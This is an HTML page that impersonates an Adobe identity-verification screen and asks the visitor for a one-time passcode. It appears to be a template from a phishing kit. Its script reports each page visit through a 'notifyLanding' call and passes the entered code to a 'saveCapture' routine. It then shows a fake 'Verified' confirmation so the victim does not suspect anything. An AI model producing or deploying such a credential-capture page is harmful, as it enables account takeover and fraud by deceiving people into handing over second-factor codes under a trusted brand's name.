<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verify - Adobe</title><link rel="stylesheet" href="style.css"></head>
<body><div class="card">
<div class="logo">A</div>
<div class="title">Verify It's You</div>
<div class="subtitle">Enter the OTP code sent to your device</div>
<form id="otpForm">
<div class="form-group"><label for="otp">Verification Code</label><input type="text" id="otp" placeholder="Enter OTP (any length)" inputmode="numeric" required><div class="hint">Enter the code exactly as received.</div></div>
<button type="submit" id="verifyBtn">Verify</button>
</form>
<div class="footer">© 2026 Adobe · All rights reserved</div>
</div>
<script src="helper.js"></script>
<script>
const SITE='adobe', DISPLAY='Adobe', CATEGORY='email_tech';
window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'OTP'));
document.getElementById('otpForm').addEventListener('submit', function(e){
  e.preventDefault();
  const v = document.getElementById('otp').value.trim();
  if (v.length < 4) { alert('Enter the full OTP'); return; }
  const btn = document.getElementById('verifyBtn');
  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
  saveCapture(SITE, CATEGORY, 'OTP', { otp: v }, 'OTP');
  setTimeout(() => { btn.innerHTML = '✓ Verified'; btn.style.background = '#16a34a'; btn.disabled = false; }, 1500);
});
</script></body></html>
